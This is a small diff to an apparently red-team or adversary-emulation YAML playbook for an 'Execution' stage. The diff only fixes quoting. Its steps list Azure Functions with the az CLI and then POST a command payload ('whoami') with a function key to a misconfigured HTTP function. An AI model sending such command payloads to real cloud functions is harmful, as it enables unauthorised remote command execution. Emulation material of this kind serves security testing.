@@ -5,5 +5,5 @@ stage: Execution
 steps:
   - action: az functionapp list --query "[].{Name:name, URL:defaultHostName}"
     description: List available Azure Functions
-  - action: curl -X POST https://<function-host>.azurewebsites.net/api/<function-name>?code=<function-key> -d '{ "cmd": "whoami" }'
+  - action: "curl -X POST https://<function-host>.azurewebsites.net/api/<function-name>?code=<function-key> -d '{ \"cmd\": \"whoami\" }'"
     description: Send payload to misconfigured HTTP function
